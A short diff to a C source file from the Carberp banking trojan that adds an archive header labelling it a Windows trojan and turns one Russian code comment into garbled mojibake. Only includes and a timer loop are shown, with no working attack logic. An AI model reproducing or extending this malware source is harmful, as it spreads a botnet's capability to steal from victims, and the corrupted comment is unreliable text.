@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <winsock2.h>
 #include <windows.h>
 
@@ -746,7 +757,7 @@ DWORD WINAPI RunTimer( LPVOID lpData )
 
 	while ( 1 )
 	{
-		pWaitForSingleObject( hTimerThread, 1000 * 60 * 1 );//60 раз проверяем не поставлен ли флаг об бднулении
+		pWaitForSingleObject( hTimerThread, 1000 * 60 * 1 );//60 пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 		iCount += 1;
 
